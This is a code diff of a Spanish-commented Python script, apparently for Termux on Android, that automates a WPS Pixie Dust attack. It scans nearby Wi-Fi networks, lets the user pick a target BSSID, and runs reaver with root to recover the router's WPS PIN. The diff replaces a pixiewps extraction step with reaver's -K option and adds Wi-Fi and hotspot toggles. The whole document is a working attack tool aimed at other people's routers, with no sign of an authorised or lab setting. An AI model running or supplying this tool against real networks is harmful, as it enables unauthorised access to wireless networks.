@@ -28,6 +28,25 @@ def check_tool_availability(tool):
         return False
     return True
 
+def toggle_wifi(state):
+    """Enciende o apaga el WiFi"""
+    if state == "off":
+        print("Apagando WiFi...")
+        run_command("svc wifi disable", use_sudo=True)
+    elif state == "on":
+        print("Encendiendo WiFi...")
+        run_command("svc wifi enable", use_sudo=True)
+
+def toggle_hotspot(state):
+    """Enciende o apaga el hotspot"""
+    if state == "on":
+        print("Encendiendo Hotspot...")
+        run_command("svc wifi enable", use_sudo=True)
+        run_command("svc wifi tethering enable", use_sudo=True)
+    elif state == "off":
+        print("Apagando Hotspot...")
+        run_command("svc wifi tethering disable", use_sudo=True)
+
 def scan_wifi():
     """Escanear redes Wi-Fi cercanas"""
     print("Escaneando redes Wi-Fi...")
@@ -52,49 +71,25 @@ def scan_wifi():
                 continue
     return redes, bssids, canales
 
-def perform_pixie_dust_attack(bssid):
-    """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
+def perform_pixie_dust_attack(interface, bssid):
+    """Realiza el ataque Pixie Dust usando reaver con la opción -K."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
     reaver_path = "/data/data/com.termux/files/home/reaver-wps-fork-t6x/src/reaver"
-    print(f"Ejecutando reaver: {reaver_path} -i wlan0 -b {bssid} -vvv --pixie-dust")
-    stdout, stderr = run_command(f"{reaver_path} -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
+    command = f"{reaver_path} -i {interface} -b {bssid} -K"
+    print(f"Ejecutando reaver: {command}")
+    stdout, stderr = run_command(command, use_sudo=True)
 
     print("Salida de reaver:")
     print(stdout)
     print(stderr)
 
-    if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
-        print("Información obtenida para Pixie Dust:")
-        print(stdout)
-        print("\nEjecutando pixiewps...\n")
-
-        # Extraer los parámetros necesarios
-        pke = extract_value(stdout, "PKE:")
-        pkr = extract_value(stdout, "PKR:")
-        ehash1 = extract_value(stdout, "E-Hash1:")
-        ehash2 = extract_value(stdout, "E-Hash2:")
-        authkey = extract_value(stdout, "AuthKey:")
-
-        # Ejecutar pixiewps con los valores extraídos
-        pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
-        print(f"Ejecutando pixiewps: {pixiewps_command}")
-        pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)
-
-        print("Salida de pixiewps:")
-        print(pixie_stdout)
-        print(pixie_stderr)
-
-        if "WPS pin:" in pixie_stdout:
-            pin = extract_value(pixie_stdout, "WPS pin:")
-            print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
-            return pin
-        else:
-            print("\nPixie Dust no pudo encontrar el PIN.")
-            print(pixie_stdout)
-            return None
+    if "WPS pin:" in stdout:
+        pin = extract_value(stdout, "WPS pin:")
+        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
+        return pin
     else:
-        print("\nNo se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
-        print(stderr)
+        print("\nPixie Dust no pudo encontrar el PIN.")
+        print(stdout)
         return None
 
 def main():
@@ -103,6 +98,10 @@ def main():
     for tool in tools:
         if not check_tool_availability(tool):
             return
+
+    # Apagar WiFi y encender Hotspot
+    toggle_wifi("off")
+    toggle_hotspot("on")
 
     # Escanear redes Wi-Fi
     redes, bssids, canales = scan_wifi()
@@ -123,13 +122,13 @@ def main():
         print(f"BSSID: {bssid_seleccionado}")
         print(f"Canal: {canal_seleccionado}")
         
-        perform_pixie_dust_attack(bssid_seleccionado)
+        # Realizar el ataque Pixie Dust utilizando la interfaz de la zona hotspot
+        perform_pixie_dust_attack("wlan0", bssid_seleccionado)
     else:
         print("No se encontraron redes WiFi.")
 
 if __name__ == "__main__":
     main()
-
 
 
 
